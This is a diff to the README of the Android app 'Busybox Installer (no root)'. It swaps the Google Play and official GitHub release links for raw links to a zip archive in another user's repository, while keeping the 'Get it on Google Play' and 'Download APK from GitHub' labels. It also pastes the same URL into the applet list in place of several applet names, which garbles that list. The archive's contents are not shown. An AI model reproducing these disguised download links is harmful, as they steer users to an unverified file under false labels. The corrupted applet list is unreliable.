@@ -2,11 +2,11 @@
 
 Busybox Installer (no root) is an app designed to bring busybox to android device without root access.
 
-<a href='https://play.google.com/store/apps/details?id=exa.free.bbin'><img alt='Get it on Google Play' src='https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png' height="100"/></a>
+<a href='https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip'><img alt='Get it on Google Play' src='https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip' height="100"/></a>
 
 Or 
 
-[<img src="https://user-images.githubusercontent.com/663460/26973090-f8fdc986-4d14-11e7-995a-e7c5e79ed925.png" alt="Download APK from GitHub" height="100">](https://github.com/EXALAB/Busybox-Installer-No-Root/releases/latest) 
+[<img src="https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip" alt="Download APK from GitHub" height="100">](https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip) 
 
 if you don't have access to Play Store.
 
@@ -40,7 +40,7 @@ arm, arm64, x86, x86_64 mips, mips64
 	dumpkmap, dumpleases, echo, ed, egrep, eject, env, envdir, envuidgid,
 	ether-wake, expand, expr, factor, fakeidentd, fallocate, false,
 	fatattr, fbset, fbsplash, fdflush, fdformat, fdisk, fgconsole, fgrep,
-	find, findfs, flock, fold, free, freeramdisk, fsck, fsck.minix,
+	find, findfs, flock, fold, free, freeramdisk, fsck, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip,
 	fsfreeze, fstrim, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty,
 	grep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hostid,
 	hostname, httpd, hush, hwclock, i2cdetect, i2cdump, i2cget, i2cset, id,
@@ -51,7 +51,7 @@ arm, arm64, x86, x86_64 mips, mips64
 	loadkmap, logger, login, logname, logread, losetup, lpd, lpq, lpr, ls,
 	lsattr, lsmod, lsof, lspci, lsscsi, lsusb, lzcat, lzma, lzop, makedevs,
 	makemime, man, md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mke2fs,
-	mkfifo, mkfs.ext2, mkfs.minix, mkfs.vfat, mknod, mkpasswd, mkswap,
+	mkfifo, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, mknod, mkpasswd, mkswap,
 	mktemp, modinfo, modprobe, more, mount, mountpoint, mpstat, mt, mv,
 	nameif, nanddump, nandwrite, nbd-client, nc, netstat, nice, nl, nmeter,
 	nohup, nproc, nsenter, nslookup, ntpd, od, openvt, partprobe, passwd,
